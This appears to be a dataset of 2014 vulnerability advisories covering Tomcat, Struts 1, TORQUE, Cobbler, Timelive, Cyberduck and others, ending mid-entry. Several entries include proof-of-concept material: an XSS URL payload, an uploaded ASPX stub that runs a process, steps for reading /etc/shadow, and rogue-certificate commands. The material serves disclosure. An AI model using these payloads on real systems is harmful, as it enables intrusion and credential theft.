6758,[SECURITY] CVE-2014-0095 Apache Tomcat denial of service,,CVE-2014-0095,"CVE-2014-0095 Denial of Service
Severity: Important
Vendor: The Apache Software Foundation
Versions Affected:
- Apache Tomcat 8.0.0-RC2 to 8.0.3
Description:
A regression was introduced in revision 1519838 that caused AJP
requests to hang if an explicit content length of zero was set on the
request. The hanging request consumed a request processing thread which
could lead to a denial of service.
Mitigation:
Users of affected versions should apply one of the following mitigations
- Upgrade to Apache Tomcat 8.0.5 or later
(8.0.4 contains the fix but was not released)
Credit:
This issue was reported as a possible bug via the Tomcat users mailing
list and the security implications were identified by theTomcat security
team.
References:
[1] http://tomcat.apache.org/security-8.html"
6759,[SECURITY] CVE-2014-0075 Apache Tomcat denial of service,,CVE-2014-0075,"CVE-2014-0075 Denial of Service
Severity: Important
Vendor: The Apache Software Foundation
Versions Affected:
- Apache Tomcat 8.0.0-RC1 to 8.0.3
- Apache Tomcat 7.0.0 to 7.0.52
- Apache Tomcat 6.0.0 to 6.0.39
Description:
It was possible to craft a malformed chunk size as part of a chucked
request that enabled an unlimited amount of data to be streamed to the
server, bypassing the various size limits enforced on a request. This
enabled a denial of service attack.
Mitigation:
Users of affected versions should apply one of the following mitigations
- Upgrade to Apache Tomcat 8.0.5 or later
(8.0.4 contains the fix but was not released)
- Upgrade to Apache Tomcat 7.0.53 or later
- Upgrade to Apache Tomcat 6.0.41 or later
(6.0.40 contains the fix but was not released)
Credit:
This issue was reported to the Tomcat security team by David Jorm of the
Red Hat Security Response Team.
References:
[1] http://tomcat.apache.org/security-8.html
[2] http://tomcat.apache.org/security-7.html
[3] http://tomcat.apache.org/security-6.html"
6782,CVE-2014-3446 - Unauthenticated Blind SQL Injection in BSS Continuity CMS,,CVE-2014-3446,"Vulnerability title: Unauthenticated Blind SQL Injection in BSS
Continuity CMS
CVE: CVE-2014-3446
Vendor: BSS
Product: Continuity CMS
Affected version: 4.2.22640.0
Fixed version: N/A
Reported by: Jerzy Kramarz
Details:
he following URL and parameters have been confirmed to suffer from Blind
SQL injection.
/wcm/system/pages/admin/getnode.aspx [nodeid parameter]
This vulnerability exists because nodeid variable is not sanitised
before it is used as part of an SQL query to retrived specific Node
information.
Further details at:
https://www.portcullis-security.com/security-research-and-downloads/security-advisories/cve-2014-3446/
Copyright:
Copyright (c) Portcullis Computer Security Limited 2014, All rights
reserved worldwide. Permission is hereby granted for the electronic
redistribution of this information. It is not to be edited or altered in
any way without the express written consent of Portcullis Computer
Security Limited.
Disclaimer:
The information herein contained may change without notice. Use of this
information constitutes acceptance for use in an AS IS condition. There
are NO warranties, implied or otherwise, with regard to this information
or its use. Any use of this information is at the user's risk. In no
event shall the author/distributor (Portcullis Computer Security
Limited) be held liable for any damages whatsoever arising out of or in
connection with the use or spread of this information."
6783,CVE-2014-3450 - Privilege Escalation in Panda Security,,CVE-2014-3450,"Vulnerability title: Privilege Escalation in Panda Security
CVE: CVE-2014-3450
Vendor: Panda
Product: Security
Affected version: See below
Fixed version: See below
Reported by: Kyriakos Economou
Details:
All users of the following (and possibly earlier) versions of Panda
security products for Windows are vulnerable to a local privilege
escalation which allows a local attacker to elevate privileges from any
account type and execute code as SYSTEM, thus obtaining full access over
the compromised host.
Panda Gold Protection v7.01.01
Panda Global Protection 2014 v7.01.01
Panda Internet Security 2014 v19.01.01
Panda AV Pro 2014 v13.01.01
Hotfixes for these products have been released.
Further details at:
https://www.portcullis-security.com/security-research-and-downloads/security-advisories/cve-2014-3450/
Copyright:
Copyright (c) Portcullis Computer Security Limited 2014, All rights
reserved worldwide. Permission is hereby granted for the electronic
redistribution of this information. It is not to be edited or altered in
any way without the express written consent of Portcullis Computer
Security Limited.
Disclaimer:
The information herein contained may change without notice. Use of this
information constitutes acceptance for use in an AS IS condition. There
are NO warranties, implied or otherwise, with regard to this information
or its use. Any use of this information is at the user's risk. In no
event shall the author/distributor (Portcullis Computer Security
Limited) be held liable for any damages whatsoever arising out of or in
connection with the use or spread of this information."
6784,CVE-2014-3447 - Remote Denial Of Service in BSS Continuity CMS,,CVE-2014-3447,"Vulnerability title: Remote Denial Of Service in BSS Continuity CMS
CVE: CVE-2014-3447
Vendor: BSS
Product: Continuity CMS
Affected version: 4.2.22640.0
Fixed version: N/A
Reported by: Jerzy Kramarz
Details:
By repeatedly calling node enumeration script, a remote unauthenticated
attacker can overload the underlying database within a few minutes. An
average number of GET requests that would stop the database supporting
the CMS were found to be 70, and in this point the Database daemon have
to be restarted. The vulnerability exists within the system due to heavy
processing invoked by the 'fix paths' script, which attempts to connect
to every node in the system and reiterate its properties via database
update function.
Further details at:
https://www.portcullis-security.com/security-research-and-downloads/security-advisories/cve-2014-3447/
Copyright:
Copyright (c) Portcullis Computer Security Limited 2014, All rights
reserved worldwide. Permission is hereby granted for the electronic
redistribution of this information. It is not to be edited or altered in
any way without the express written consent of Portcullis Computer
Security Limited.
Disclaimer:
The information herein contained may change without notice. Use of this
information constitutes acceptance for use in an AS IS condition. There
are NO warranties, implied or otherwise, with regard to this information
or its use. Any use of this information is at the user's risk. In no
event shall the author/distributor (Portcullis Computer Security
Limited) be held liable for any damages whatsoever arising out of or in
connection with the use or spread of this information."
6785,CVE-2014-3448 - Remote Code Execution Via Unauthenticated File Upload in BSS Continuity CMS,,CVE-2014-3448,"Vulnerability title: Remote Code Execution Via Unauthenticated File
Upload in BSS Continuity CMS
CVE: CVE-2014-3448
Vendor: BSS
Product: Continuity CMS
Affected version: 4.2.22640.0
Fixed version: N/A
Reported by: Jerzy Kramarz
Details:
The ASPX executable which is responsible for handling file upload
functionality allows arbitrary files to be uploaded to any directory
specified by the attackers as the file upload function does not does not
verify file type or origin when processing the request.
Further details at:
https://www.portcullis-security.com/security-research-and-downloads/security-advisories/cve-2014-3448/
Copyright:
Copyright (c) Portcullis Computer Security Limited 2014, All rights
reserved worldwide. Permission is hereby granted for the electronic
redistribution of this information. It is not to be edited or altered in
any way without the express written consent of Portcullis Computer
Security Limited.
Disclaimer:
The information herein contained may change without notice. Use of this
information constitutes acceptance for use in an AS IS condition. There
are NO warranties, implied or otherwise, with regard to this information
or its use. Any use of this information is at the user's risk. In no
event shall the author/distributor (Portcullis Computer Security
Limited) be held liable for any damages whatsoever arising out of or in
connection with the use or spread of this information."
6821,[CVE-2014-0749] TORQUE Buffer Overflow,,CVE-2014-0749,"A buffer overflow exists in versions of TORQUE which can be exploited in order to remotely execute code from an unauthenticated perspective. This issue is exploitable in all versions of the 2.5 branch, upto and including 2.5.13
Software: TORQUE
Affected Versions: All 2.5 releases up to and including 2.5.13
CVE Reference: CVE-2014-0749
Authors: John Fitzpatrick (MWR Labs)
Severity: High Risk
Vendor: Adaptive Computing
Vendor Response: Incorporated MWR supplied fix into 2.5 development branch, no advisory
[Description]
A buffer overflow exists in older versions of TORQUE which can be exploited in order to remotely execute code from an unauthenticated perspective. This issue is exploitable in all versions of the 2.5 branch, up to and including 2.5.13.
[Impact]
Successful exploitation allows remote execution of code as root.
[Cause]
This issue exists as a result of a misplaced bounds check.
[Solution]
Despite still being widely used Torque 2.5.x is now end of life and no longer supported by Adaptive. The latest version of the 2.5 branch (2.5.13) is vulnerable to this issue. MWR have submitted a fix to the 2.5-dev GitHub repository (which is still active) which resolves this issue. It is strongly recommended that a version of 2.5-dev (later than pull request #171) is updated to.
Code changes in the 4.2.x branch significantly enhance the security posture of TORQUE and so MWR would recommend updating to this branch if possible.
[Technical Details]
TORQUE is a widely used resource manager. There are several branches 2.x, 3.x and 4.�. The code is open source, but maintained by Adaptive Computing.
Operations such as job submissions and querying of job queues within TORQUE are handled by the pbs_server component. It was found that the pbs_server did not perform sufficient bounds checking on messages sent to it. As a result it was found to be possible to submit messages which resulted in an overflow leading to arbitrary code execution. This could be achieved from a remote, unauthenticated perspective regardless of whether the source IP address is permitted to submit jobs or not.
The vulnerability exists because the file disrsi_.c fails to ensure that the length of count (which is read from the request packet) is less than dis_umaxd prior to being used in a later memcpy(). As a result a specially crafted request can smuggle through a count value which is later decremented and becomes the ct value in a memcpy() made from within tcp_gets():
memcpy((char *)str, tp->tdis_leadp, ct);
This failure to validate count allows control over the size of the memcpy() to be leveraged and as a result control over the amount of data read from the remainder of the packet. If this value is large the memcpy() will overwrite the stack and so can be leveraged in order to gain control over the execution of the program.
A backtrace showing the flow of execution is shown below:
#0 0x0000003dd4a88b9a in memcpy () from /lib64/libc.so.6
#1 0x00007fa0008cb65b in tcp_gets (fd=11, str=0x7fff8dfce741 '3' <repeats 26 times>,
""Ab1Ab2Ab3"",
ct=332) at ../Libifl/tcp_dis.c:567
#2 0x00007fa0008be994 in disrsi_ (stream=11, negate=0x7fff8dfce93c, value=0x7fff8dfce938,
count=333)
at ../Libdis/disrsi_.c:187
#3 0x00007fa0008bea1a in disrsi_ (stream=11, negate=0x7fff8dfce93c, value=0x7fff8dfce938,
count=<value optimized out>) at ../Libdis/disrsi_.c:216
#4 0x00007fa0008bea1a in disrsi_ (stream=11, negate=0x7fff8dfce93c, value=0x7fff8dfce938,
count=<value optimized out>) at ../Libdis/disrsi_.c:216
#5 0x00007fa0008bdfab in disrfst (stream=11, achars=33, value=0x27f0b58 """")
at ../Libdis/disrfst.c:125
#6 0x00007fa0008c13ba in decode_DIS_ReqHdr (sock=11, preq=0x27f0b20,
proto_type=0x7fff8dfce9dc,
proto_ver=0x7fff8dfce9d8) at ../Libifl/dec_ReqHdr.c:141
#7 0x0000000000409ba1 in dis_request_read (sfds=11, request=0x27f0b20) at dis_read.c:137
#8 0x000000000041cb6e in process_request (sfds=11) at process_request.c:355
#9 0x00007fa0008d4899 in wait_request (waittime=<value optimized out>, SState=0x72c258)
at ../Libnet/net_server.c:508
#10 0x000000000041afeb in main_loop () at pbsd_main.c:1203
#11 0x000000000041bd15 in main (argc=<value optimized out>, argv=<value optimized out>)
at pbsd_main.c:1760
TORQUE is required to run as root and so successful exploitation leads to code execution as root. MWR have created a proof of concept exploit for TORQUE running on 64bit versions of CentOS which makes use of return oriented programming and ROP gadgets in order to execute arbitrary code as root. This vulnerability can be exploited reliably and remotely. It is possible to reach this path of execution from a remote and unauthenticated perspective (and regardless of whether the attackers system is in the acl_hosts list or not). It is expected that code execution within a 32bit environment is simpler to achieve.
Whilst the necessary bounds check was found to be missing from all versions of TORQUE reviewed this issue was only found to be directly exploitable in the 2.5 branch; code changes which have taken place in the 4.x branches prevent the condition required for exploitation from being reached. The vulnerability exists because the necessary check on the size of count occurs too late within the disrsi_.c file. The fix is, therefore, to introduce the appropriate check on the size of �count�. Replacing disrsi_.c with the patched 2.5-dev version (https://github.com/adaptivecomputing/torque/blob/2.5-dev/src/lib/Libdis/disrsi_.c) and recompiling should be sufficient to resolve this issue.
[Detailed Timeline]
2012: Vulnerability identified
06/12/2012: Proof of concept developed
22/07/2013: Vulnerability reported to Adaptive Computing
20/08/2013: MWR requested update from Adaptive
22/08/2013: Github pull request to resolve issue made by MWR with a fix
21/01/2014: Further communication with Adaptive
13/05/2014: Advisory published
[Original Advisory]
https://labs.mwrinfosecurity.com/system/assets/662/original/torque-buffer-overflow_2014-05-14.pdf"
6834,FD - Cobbler Arbitrary File Read CVE-2014-3225,,CVE-2014-3225,"Vulnerability title: Arbitrary file read
CVE: CVE-2014-3225
Vendor: Cobbler
Product: Cobbler
Affected version: <=2.6.0
Fixed version: N/A
Reported by: Dolev Farhi
----------------------------
VULNERABILITY Details:
----------------------------
In all Cobbler versions (<= 2.6.0) an arbitrary system files read
vulnerability is possible via the cobbler profile creation page.
Cobbler does not validate the file is a .ks file nor does it restrict the
user to a certain path.
Cobbler runs under the root user privileges, which allows read access to all
system files.
This issue exposes all files to any attacker attempting to provide full file
path to crucial system files such as /etc/passwd or /etc/shadow in the
Kickstart path.
https://github.com/cobbler/cobbler/issues/939
--------------------
Proof of concept
--------------------
Create a regular cobbler profile, assign a distribution to it.
In kickstart value, provide /etc/shadow or any other file.
Save -> navigate to ""View kickstart"" -> file is shown.
------------------------------
PROOF OF CONCEPT vid
------------------------------
https://www.youtube.com/watch?v=vuBaoQUFEYQ"
6836,CVE-2014-2046 - Unauthenticated Credential And Configuration Retrieval In Broadcom Ltd PIPA C211,,CVE-2014-2046,"Vulnerability title: Unauthenticated Credential And Configuration
Retrieval In Broadcom Ltd PIPA C211
CVE: CVE-2014-2046
Vendor: Broadcom Ltd
Product: PIPA C211
Affected version: Soft Rev: SR1.1, HW Rev: PIPA C211 rev2
Fixed version: N/A
Reported by: Jerzy Kramarz
Details:
By sending a crafted POST request to the BROADCOM PIPA C211 web
interface it is possible to retrieve complete system configuration
including administrative credentials, SMTP community strings, FTP upload
credentials and all system user credentials:
Further details at:
https://www.portcullis-security.com/security-research-and-downloads/security-advisories/cve-2014-2046/
Copyright:
Copyright (c) Portcullis Computer Security Limited 2014, All rights
reserved worldwide. Permission is hereby granted for the electronic
redistribution of this information. It is not to be edited or altered in
any way without the express written consent of Portcullis Computer
Security Limited.
Disclaimer:
The information herein contained may change without notice. Use of this
information constitutes acceptance for use in an AS IS condition. There
are NO warranties, implied or otherwise, with regard to this information
or its use. Any use of this information is at the user's risk. In no
event shall the author/distributor (Portcullis Computer Security
Limited) be held liable for any damages whatsoever arising out of or in
connection with the use or spread of this information."
6866,CVE-2014-0930 - Kernel Memory Leak And Denial Of Service Condition in IBM AIX,,CVE-2014-0930,"Vulnerability title: Kernel Memory Leak And Denial Of Service Condition
in IBM AIX
CVE: CVE-2014-0930
Vendor: IBM
Product: AIX
Affected version: 5.3, 6.1 and 7.1 releases VIOS 2.2.*
Fixed version: Interim version
Reported by: Tim Brown
Details:
It has been identified that the ptrace() system call can be manipulated
by an unprivileged user into leaking uninitialised kernel memory and
that the method by which this is achieved may also lead to a denial of
service condition. This can be achieved by manipulating the parameters
that are passed to the ptrace() system call when performing the
PT_LDINFO operation.
By calling ptrace(PT_LDINFO, childpid, leakbuffer, maximumleak, NULL)
with a value of maximumleak that greater than that required for the
expected result of the PT_LDINFO operation, the AIX kernel will
xmalloc() this space (without initialising it), populate it and then
perform a copy operation that returns the result within leakbuffer.
Further details at:
https://www.portcullis-security.com/security-research-and-downloads/security-advisories/cve-2014-0930/
Copyright:
Copyright (c) Portcullis Computer Security Limited 2014, All rights
reserved worldwide. Permission is hereby granted for the electronic
redistribution of this information. It is not to be edited or altered in
any way without the express written consent of Portcullis Computer
Security Limited.
Disclaimer:
The information herein contained may change without notice. Use of this
information constitutes acceptance for use in an AS IS condition. There
are NO warranties, implied or otherwise, with regard to this information
or its use. Any use of this information is at the user's risk. In no
event shall the author/distributor (Portcullis Computer Security
Limited) be held liable for any damages whatsoever arising out of or in
connection with the use or spread of this information."
6867,CVE-2014-2882 - Lack of SSL Certificate Validation in Citrix Netscaler,,CVE-2014-2882,"Vulnerability title: Lack of SSL Certificate Validation in Citrix Netscaler
CVE: CVE-2014-2882
Vendor: Citrix
Product: Netscaler
Affected version: All prior to 10.1-122.17/9.3-66.5
Fixed version: 10.1-122.17/9.3-66.5
Reported by: Graham Sutherland
Details:
The remote configuration Java applet assigns an empty trust manager to
its SSL context, causing it to accept any certificate regardless of
validity.
Further details at:
https://www.portcullis-security.com/security-research-and-downloads/security-advisories/cve-2014-2882/
Copyright:
Copyright (c) Portcullis Computer Security Limited 2014, All rights
reserved worldwide. Permission is hereby granted for the electronic
redistribution of this information. It is not to be edited or altered in
any way without the express written consent of Portcullis Computer
Security Limited.
Disclaimer:
The information herein contained may change without notice. Use of this
information constitutes acceptance for use in an AS IS condition. There
are NO warranties, implied or otherwise, with regard to this information
or its use. Any use of this information is at the user's risk. In no
event shall the author/distributor (Portcullis Computer Security
Limited) be held liable for any damages whatsoever arising out of or in
connection with the use or spread of this information."
6868,CVE-2014-2881 - Poor Quality Implementation of Diffie-Hellman Key Exchange in Citrix Netscaler,,CVE-2014-2881,"Vulnerability title: Poor Quality Implementation of Diffie-Hellman Key
Exchange in Citrix Netscaler
CVE: CVE-2014-2881
Vendor: Citrix
Product: Netscaler
Affected version: All prior to 10.1-122.17/9.3-66.5
Fixed version: 10.1-122.17/9.3-66.5
Reported by: Graham Sutherland
Details:
The remote configuration Java applet contains a poor implementation of
the Diffie-Hellman key exchange algorithm. The random number generator
used to produce secret values is the java.util.Random class, which is
not of cryptographic quality. Publicly known predictors exist for the
underlying RNG, and the seed is either 32-bit or 48-bit depending on the
host system.
Furthermore, the selection of the secret 'a' value within the key
generation process is potentially vulnerable to timing attacks that leak
the RNG state, as the implementation loops until the RNG outputs a value
within a publicly known range.
Further details at:
https://www.portcullis-security.com/security-research-and-downloads/security-advisories/cve-2014-2881/
Copyright:
Copyright (c) Portcullis Computer Security Limited 2014, All rights
reserved worldwide. Permission is hereby granted for the electronic
redistribution of this information. It is not to be edited or altered in
any way without the express written consent of Portcullis Computer
Security Limited.
Disclaimer:
The information herein contained may change without notice. Use of this
information constitutes acceptance for use in an AS IS condition. There
are NO warranties, implied or otherwise, with regard to this information
or its use. Any use of this information is at the user's risk. In no
event shall the author/distributor (Portcullis Computer Security
Limited) be held liable for any damages whatsoever arising out of or in
connection with the use or spread of this information."
6870,CVE-2014-2845 - Cyberduck (Windows): Failure validating some certificates (using FTP-SSL) with untrusted root certificate authority,,CVE-2014-2845,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512
Advisory ID: SYSS-2014-004
Product: Cyberduck
Affected Version(s): 4.4.3 (14140) (Windows only)
Not Affected Versions(s): 4.4.3 (14140) and 4.2.1 (9350) (both OS X
10.9.2)
Tested Version(s): 4.4.3 (Windows 7 32 bit and Windows 8.1 64 bit)
Vulnerability Type: X.509 validation
Risk Level: Medium
Solution Status: Fixed
Vendor Notification: 2014-04-08
Solution Date: 2014-04-10
Public Disclosure: 2014-05-06
CVE Reference: CVE-2014-2845
Author of Advisory: Micha Borrmann (SySS GmbH)
Overview:
Cyberduck (Windows versions only) accepts X.509 server certificate
from any CA, also if they are not in the certificate store and not
sent from the FTP server; only self-signed certificates are not accepted.
Vulnerability Details:
A user can not recognize an easy to perform man-in-the-middle attack,
because the client does not validate the certificate chain of the
servers X.509 certificate. In a networking environment that is not
trustworthy, like a wifi network, using FTP AUTH TLS with Cyberduck
the servers identity can not be trusted.
Proof of Concept (PoC):
With OpenSSL generate a key for a CA and for the server and create the
certificates:
openssl genrsa -out ca4096.key 4096
openssl genrsa -out 2048.key 2048
chmod 400 *.key
mkdir demoCA
mkdir demoCA/newcerts
touch demoCA/index.txt
echo ffaabb > demoCA/serial
openssl req -key ca4096.key -out ca4096.crt -new -x509 -subj
""/C=DE/ST=BW/L=/O=SYSS/OU=/CN=CA"" -days 3652
openssl req -key 2048.key -out 2048.csr -new -subj
""/C=DE/ST=BW/L=/O=SYSS/OU=/CN=www.google.ch"" -days 365
openssl ca -keyfile ca4096.key -cert ca4096.crt -in 2048.csr -out
2048.crt -days 365
Put the key (2048.key) and the X.509 certificate (2048.crt) to a
ProFTP server and modify the configuration
<IfModule mod_tls.c>
TLSEngine on
TLSLog /var/log/proftpd/tls.log
TLSProtocol SSLv23
TLSRSACertificateFile /etc/ssl/2048.crt
TLSRSACertificateKeyFile /etc/ssl/2048.key
TLSVerifyClient off
TLSRequired on
</IfModule>
Perform a DNS spoofing for www.google.ch and use Cyberduck to access
this system with FTP-SSL (Explicit AUTH TLS).
Solution: Upgrade to Cyberduck 4.4.4
Disclosure Timeline:
April 08, 2014 - Vulnerability discovered
April 08, 2014 - Vulnerability reported to vendor
April 08, 2014 - First Vendor response
April 10, 2014 - Bug was confirmed and fixed by the vendor
April 10, 2014 - Bugfix could be confirmed with Cyberduck 4.4.4 (14478)
April 24, 2014 - Cyberduck 4.4.4 (14505) was released [1]
References:
[1] https://cyberduck.io/changelog/
Credits:
Security vulnerability found by Micha Borrmann of the SySS GmbH.
Disclaimer:
The information provided in this security advisory is provided ""as is""
and without warranty of any kind. Details of this security advisory
may be updated in order to provide as accurate information as
possible. The latest version of this security advisory is available on
the SySS web site.
Copyright:
Creative Commons - Attribution (by) - Version 3.0
URL: http://creativecommons.org/licenses/by/3.0/deed.en
-----BEGIN PGP SIGNATURE-----
iQIcBAEBCgAGBQJTaKnfAAoJEPxn66kbURKKz48QAJ40OgXXHW92wgtxZz2vhWOD
XfD2CFs/BeYqS9eKfMOHhnmIYqX756oknm/05pU8McJfp2JGsKOnmXSJhp+68lU9
EC8hyq9RWEdOO0xQcVTzxmcqJgSCfvKm/G0KOVwWk9UnT84I6IX9eDCKWJUQVHuH
8bv2BqqhCRjHOhjyoBiWmkxsgMYTBqcqrBKmvUpqfYf5+yQHUWAtxUM5de0u7m3+
10cgLV+QKOXQ2AM3s59rQ8cyymohe/OLr9ZXbhIXRPndc23aWCy8fUNBXeplzLag
u26VjrvL1e5RWBL/VsSpsg9KdNb/VcSKgAOOWznpfL7uT0HN4kh6kgwAz+h2SchS
DoTRKlrMOGiZr5ZwiX8D6ZRPC6RA3a+lnMuKMVv1/WyuedU+lmHhLG1lv/md/jPr
UQnfHT4JqTFRyjD1QGKQjtZqMwJ8WG7zrANVSKetx7nUrOef6ABynSCTEI74i8OA
Avrh6PWyjqXI4kQd0y+dAI0qCjnBwU0slXkrA+V4FYHrpWv6cc87OefiUW4jX0a6
kzEEU6ry1f7gTMu97w2kPzbxKCXaaiDeHJ7Hal5mP3GmFuTMypkYP+ykIVZYgBL7
Moxo47NMuLC1JhXLeVqLqA3gtfqZRCApyQ/Qh8TkWl6WZQOAHoPbu7yjl+MXoI8W
r5dXLS4tJ+hdOCaNsLHj
=QZy5
-----END PGP SIGNATURE-----"
6887,"Re: [ANN][SECURITY] Struts 1 - CVE-2014-0114 -Mitigation Advice Available, Possible RCE Impact",,CVE-2014-0114,"Rene,
Thank you for your insight and advice.
I have successfully secured 5 production applications with proof of
concept before and after and have re-deployed these critical
applications in under 4 hours with very little down time.
Best Regards,
Eric
>>> Rene Gielen <rgielen apache org> 5/1/2014 2:59 PM >>>
As confirmed in our last announcement, the Apache Struts 1 framework
in
all versions is affected by a ClassLoader manipulation vulnerability
(CVE-2014-0114) similar to a recently fixed vulnerability in Struts 2
(CVE-2014-0112, CVE-2014-0094) [1].
Thanks to the efforts of Alvaro Munoz and the HP Fortify team, the
Apache Struts project team can recommend a first mitigation that is
relatively simple to apply. It involves the introduction of a generic
Servlet filter, adding the possibility to blacklist unacceptable
request
parameters based on regular expressions. Please see the corresponding
HP
Fortify blog entry [2] for detailed instructions.
The HP Fortify team also informed us that the vulnerability may be
exploited for Remote Code Execution (RCE) in certain environments.
Based
on this information, the Apache Struts project team recommends to
apply
the mitigation advice *immediately* for all Struts 1 based
applications.
Struts 1 has had its End-Of-Life announcement more than one year ago
[3]. However, in a cross project effort the Struts team is looking for
a
correction or an improved mitigation path. Please stay tuned for
further
information regarding a solution.
This is a cross-list posting. If you have questions regarding this
report, please direct them to security struts apache org only.
[1] http://struts.apache.org/release/2.3.x/docs/s2-021.html
[2]
http://h30499.www3.hp.com/t5/HP-Security-Research-Blog/Protect-your-Struts1-applications/ba-p/6463188#.U2J7xeaSxro
[3] http://struts.apache.org/struts1eol-announcement.html
--
René Gielen
http://twitter.com/rgielen
---------------------------------------------------------------------
To unsubscribe, e-mail: user-unsubscribe struts apache org
For additional commands, e-mail: user-help struts apache org"
6888,"[ANN][SECURITY] Struts 1 - CVE-2014-0114 -Mitigation Advice Available, Possible RCE Impact",,CVE-2014-0114,"As confirmed in our last announcement, the Apache Struts 1 framework in
all versions is affected by a ClassLoader manipulation vulnerability
(CVE-2014-0114) similar to a recently fixed vulnerability in Struts 2
(CVE-2014-0112, CVE-2014-0094) [1].
Thanks to the efforts of Alvaro Munoz and the HP Fortify team, the
Apache Struts project team can recommend a first mitigation that is
relatively simple to apply. It involves the introduction of a generic
Servlet filter, adding the possibility to blacklist unacceptable request
parameters based on regular expressions. Please see the corresponding HP
Fortify blog entry [2] for detailed instructions.
The HP Fortify team also informed us that the vulnerability may be
exploited for Remote Code Execution (RCE) in certain environments. Based
on this information, the Apache Struts project team recommends to apply
the mitigation advice *immediately* for all Struts 1 based applications.
Struts 1 has had its End-Of-Life announcement more than one year ago
[3]. However, in a cross project effort the Struts team is looking for a
correction or an improved mitigation path. Please stay tuned for further
information regarding a solution.
This is a cross-list posting. If you have questions regarding this
report, please direct them to security struts apache org only.
[1] http://struts.apache.org/release/2.3.x/docs/s2-021.html
[2]
http://h30499.www3.hp.com/t5/HP-Security-Research-Blog/Protect-your-Struts1-applications/ba-p/6463188#.U2J7xeaSxro
[3] http://struts.apache.org/struts1eol-announcement.html
--
Renï¿œ Gielen
http://twitter.com/rgielen"
6916,[ANN][SECURITY] ClassLoader manipulation issue confirmed for Struts 1 - CVE-2014-0114,,CVE-2014-0114,"The Apache Struts project team confirms that Struts 1 in all versions is
affected by a ClassLoader manipulation vulnerability similar to a
recently fixed vulnerability in Struts 2 (CVE-2014-0112, CVE-2014-0094) [1].
This is a different underlying flaw. For future reference, please use
CVE-2014-0114 in regards to this issue.
Struts 1 has had its End-Of-Life announcement one year ago. In a cross
project effort, the Struts team is looking for a correction or
mitigation path though. Please stay tuned for further information
regarding a solution.
This is a cross-list posting. If you have questions regarding this
report, please direct them to security struts apache org only.
[1] http://struts.apache.org/release/2.3.x/docs/s2-021.html
--
Renï¿œ Gielen
http://twitter.com/rgielen"
6930,[CVE-2014-2715] Cross-site scripting (XSS) vulnerability in Videowhisper,,CVE-2014-2715,"Vulnerability title: Cross-site scripting (XSS) vulnerability in Videowhisper
CVE: CVE-2014-2715
Vendor: VideoWhisper
Product: Videowhisper module for Drupal 7
Affected version: 7
Fixed version:
Reported by: Mahmoud Ghorbanzadeh
Details:
Hello,
I found Cross-site scripting (XSS) vulnerability in the Videowhisper module for Drupal 7 (videowhisper-7.x). The vulnerability exist at line 2 and line 4 in drupalmodulesvideowhispervwrooms emplateslogout.tpl.php due to $_GET['module'] and $_GET['message'] variables respectively at line 347 in drupalmodulesvideowhispervwroomsvwrooms.module.
POC: drupal/index.php?q=vwrooms/logout&module=<script>alert('XSS1')</script>&message=<script>alert('XSS2')</script>
Vendor Notification: 18, Apr 2014
Discovered by Mahmoud Ghorbanzadeh, in Amirkabir University of Technology's Scientific Excellence and Research Centers.
Best Regards."
6948,CVE-2014-2042 - Unrestricted file upload in Livetecs Timelive,,CVE-2014-2042,"Vulnerability title: Unrestricted file upload in Livetecs Timelive
CVE: CVE-2014-2042
Vendor: Livetecs
Product: Timelive
Affected version: 6.2.71
Fixed version: 6.5.1
Reported by: Richard Hatch
Details:
It was discovered that it was possible for low-level TimeLive
application users to upload
files (by using the ""My Projects""..""Manage Project"" functionality).
There was no restriction on
file types that could be uploaded and the permissions applied to those
uploaded files included
""Read and Execute"".
1. Using any text editor create a new file ""run-cacl.aspx"" and add the
following content:
<%@ Page Language=""VB"" %>
<%
System.Diagnostics.Process.Start(""calc.exe"")
%>
2. Login to the TimeLive application as a low-level (standard) user
3. Click ""My Projects"" from the left-hand menu
4. Click the ""Manage"" icon - It looks like a notepad and pen
5. Scroll to the bottom of the page that opens and click ""Attachment""
6. Click ""Browse"" and navigate to to where you saved ""run-cacl.exe""
7. Click ""Upload""
8. Logout of TimeLive [Optional]
9. On the server hosting the TimeLive application run ""TaskMgr""
9. Browse to http://MyTimeLiveURL/Uploads/1/1/run-cacl.aspx
10. Observe ""calc.exe"" running as ""NETWORK_SERVICE"" in the Task manager
Note: Depending on the configuration of the TimeLive application used
for testing it may be
necessary to change the ""1/1"" part of the URL.
Further details at:
https://www.portcullis-security.com/security-research-and-downloads/security-advisories/cve-2014-2042/
Copyright:
Copyright (c) Portcullis Computer Security Limited 2014, All rights
reserved worldwide. Permission is hereby granted for the electronic
redistribution of this information. It is not to be edited or altered in
any way without the express written consent of Portcullis Computer
Security Limited.
Disclaimer:
The information herein contained may change without notice. Use of this
information constitutes acceptance for use in an AS IS condition. There
are NO warranties, implied or otherwise, with regard to this information
or its use. Any use of this information is at the user's risk. In no
event shall the author/distributor (Portcullis Computer Security
Limited) be held liable for any damages whatsoever arising out of or in
connection with the use or spread of this information."
6949,CVE-2014-1217 - Unauthenticated access to sensitive information and functionality in Livetecs Timelive,,CVE-2014-1217,"Vulnerability title: Unauthenticated access to sensitive information and
functionality in Livetecs Timelive
CVE: CVE-2014-1217
Vendor: Livetecs
Product: Timelive
Affected version: 6.2.71
Fixed version: 6.2.8
Reported by: Richard Hatch
Details:
It was possible to access a URL that allowed unauthenticated access
to sensitive configuration change functionality, and also revealed the
database connection
string (including authentication credentials) used by TimeLive to access
the database.
The following URL was identified:
http://MyTimeLiveServer/home/systemsetting.aspx
Note: This URL was identified by entering ""timelive default credentials""
into the Google
Internet search engine. At time of writing the URL was revealed by the
first result returned
by Google.
Further details at:
https://www.portcullis-security.com/security-research-and-downloads/security-advisories/cve-2014-1217/
Copyright:
Copyright (c) Portcullis Computer Security Limited 2014, All rights
reserved worldwide. Permission is hereby granted for the electronic
redistribution of this information. It is not to be edited or altered in
any way without the express written consent of Portcullis Computer
Security Limited.
Disclaimer:
The information herein contained may change without notice. Use of this
information constitutes acceptance for use in an AS IS condition. There
are NO warranties, implied or otherwise, with regard to this information
or its use. Any use of this information is at the user's risk. In no
event shall the author/distributor (Portcullis Computer Security
Limited) be held liable for any damages whatsoever arising out of or in
connection with the use or spread of this information."
6950,CVE-2014-2383 - Arbitrary file read in dompdf,,CVE-2014-2383,"Vulnerability title: Arbitrary file read in dompdf
CVE: CVE-2014-2383
Vendor: dompdf
Product: dompdf
Affected version: v0.6.0
Fixed version: v0.6.1 (partial fix)
Reported by: Alejo Murillo Moyas
Details:
An arbitrary file read vulnerability is present on dompdf.php file that
allows remote or local attackers to read local files using a special
crafted argument. This vulnerability requires the configuration flag
